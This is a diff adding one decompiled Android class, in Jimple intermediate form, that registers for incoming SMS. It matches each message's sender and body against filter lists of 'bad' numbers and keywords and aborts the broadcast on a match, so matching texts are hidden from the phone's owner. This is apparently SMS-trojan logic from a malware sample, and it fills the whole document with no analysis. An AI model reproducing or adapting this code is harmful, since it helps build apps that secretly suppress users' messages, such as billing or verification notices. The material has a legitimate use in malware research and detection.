@@ -1,0 +1,133 @@
+public class com.xxx.yyy.MessageReceiver extends android.content.BroadcastReceiver
+{
+    static final java.lang.String ACTION;
+    com.xxx.yyy.SmsGetHandler smshandler;
+
+    public void <init>()
+    {
+        com.xxx.yyy.MessageReceiver r0;
+
+        r0 := @this: com.xxx.yyy.MessageReceiver;
+        specialinvoke r0.<android.content.BroadcastReceiver: void <init>()>();
+        r0.<com.xxx.yyy.MessageReceiver: com.xxx.yyy.SmsGetHandler smshandler> = null;
+        return;
+    }
+
+    private boolean Checksms(com.xxx.yyy.SmsGetHandler, android.telephony.gsm.SmsMessage)
+    {
+        com.xxx.yyy.MessageReceiver r0;
+        com.xxx.yyy.SmsGetHandler r1;
+        android.telephony.gsm.SmsMessage r2;
+        java.util.Iterator r3, r8;
+        java.lang.String r4, r5, $r11, $r14;
+        java.util.List $r6, $r7;
+        boolean $z0, $z1, $z2, $z3, $z4;
+        java.lang.Object $r9, $r12;
+        com.xxx.yyy.SMSEntityBad $r10, $r13;
+
+        r0 := @this: com.xxx.yyy.MessageReceiver;
+        r1 := @parameter0: com.xxx.yyy.SmsGetHandler;
+        r2 := @parameter1: android.telephony.gsm.SmsMessage;
+        r4 = virtualinvoke r2.<android.telephony.gsm.SmsMessage: java.lang.String getOriginatingAddress()>();
+        r5 = virtualinvoke r2.<android.telephony.gsm.SmsMessage: java.lang.String getMessageBody()>();
+        $r6 = r1.<com.xxx.yyy.SmsGetHandler: java.util.List filterMdnList>;
+        r3 = interfaceinvoke $r6.<java.util.List: java.util.Iterator iterator()>();
+
+     label0:
+        $z0 = interfaceinvoke r3.<java.util.Iterator: boolean hasNext()>();
+        if $z0 != 0 goto label2;
+
+        $r7 = r1.<com.xxx.yyy.SmsGetHandler: java.util.List filterKeyList>;
+        r8 = interfaceinvoke $r7.<java.util.List: java.util.Iterator iterator()>();
+
+     label1:
+        $z1 = interfaceinvoke r8.<java.util.Iterator: boolean hasNext()>();
+        if $z1 != 0 goto label3;
+
+        $z2 = virtualinvoke r1.<com.xxx.yyy.SmsGetHandler: boolean FindReturnMsg(java.lang.String,java.lang.String)>(r4, r5);
+        return $z2;
+
+     label2:
+        $r9 = interfaceinvoke r3.<java.util.Iterator: java.lang.Object next()>();
+        $r10 = (com.xxx.yyy.SMSEntityBad) $r9;
+        $r11 = virtualinvoke $r10.<com.xxx.yyy.SMSEntityBad: java.lang.String getKeyWord()>();
+        $z3 = virtualinvoke r4.<java.lang.String: boolean contains(java.lang.CharSequence)>($r11);
+        if $z3 == 0 goto label0;
+
+        return 1;
+
+     label3:
+        $r12 = interfaceinvoke r8.<java.util.Iterator: java.lang.Object next()>();
+        $r13 = (com.xxx.yyy.SMSEntityBad) $r12;
+        $r14 = virtualinvoke $r13.<com.xxx.yyy.SMSEntityBad: java.lang.String getKeyWord()>();
+        $z4 = virtualinvoke r5.<java.lang.String: boolean contains(java.lang.CharSequence)>($r14);
+        if $z4 == 0 goto label1;
+
+        return 1;
+    }
+
+    public void onReceive(android.content.Context, android.content.Intent)
+    {
+        com.xxx.yyy.MessageReceiver r0;
+        android.content.Context r1;
+        android.content.Intent r2;
+        int i0, i1, $i2, $i3;
+        android.telephony.gsm.SmsMessage r3;
+        java.lang.String $r4;
+        boolean $z0, $z1;
+        com.xxx.yyy.SmsGetHandler $r5, $r12;
+        android.os.Bundle r6;
+        java.lang.Object $r7, $r10;
+        java.lang.Object[] r8;
+        android.telephony.gsm.SmsMessage[] r9;
+        byte[] $r11;
+
+        r0 := @this: com.xxx.yyy.MessageReceiver;
+        r1 := @parameter0: android.content.Context;
+        r2 := @parameter1: android.content.Intent;
+        $r4 = virtualinvoke r2.<android.content.Intent: java.lang.String getAction()>();
+        $z0 = virtualinvoke $r4.<java.lang.String: boolean equals(java.lang.Object)>("android.provider.Telephony.SMS_RECEIVED");
+        if $z0 == 0 goto label1;
+
+        $r5 = new com.xxx.yyy.SmsGetHandler;
+        specialinvoke $r5.<com.xxx.yyy.SmsGetHandler: void <init>(android.content.Context)>(r1);
+        r0.<com.xxx.yyy.MessageReceiver: com.xxx.yyy.SmsGetHandler smshandler> = $r5;
+        r6 = virtualinvoke r2.<android.content.Intent: android.os.Bundle getExtras()>();
+        if r6 == null goto label1;
+
+        $r7 = virtualinvoke r6.<android.os.Bundle: java.lang.Object get(java.lang.String)>("pdus");
+        r8 = (java.lang.Object[]) $r7;
+        if r8 == null goto label1;
+
+        $i2 = lengthof r8;
+        r9 = newarray (android.telephony.gsm.SmsMessage)[$i2];
+        i0 = 0;
+        i1 = 0;
+
+     label0:
+        $i3 = lengthof r8;
+        if i0 < $i3 goto label2;
+
+        if i1 <= 0 goto label1;
+
+        virtualinvoke r0.<com.xxx.yyy.MessageReceiver: void abortBroadcast()>();
+
+     label1:
+        return;
+
+     label2:
+        $r10 = r8[i0];
+        $r11 = (byte[]) $r10;
+        r3 = staticinvoke <android.telephony.gsm.SmsMessage: android.telephony.gsm.SmsMessage createFromPdu(byte[])>($r11);
+        r9[i0] = r3;
+        $r12 = r0.<com.xxx.yyy.MessageReceiver: com.xxx.yyy.SmsGetHandler smshandler>;
+        $z1 = specialinvoke r0.<com.xxx.yyy.MessageReceiver: boolean Checksms(com.xxx.yyy.SmsGetHandler,android.telephony.gsm.SmsMessage)>($r12, r3);
+        if $z1 == 0 goto label3;
+
+        i1 = i1 + 1;
+
+     label3:
+        i0 = i0 + 1;
+        goto label0;
+    }
+}
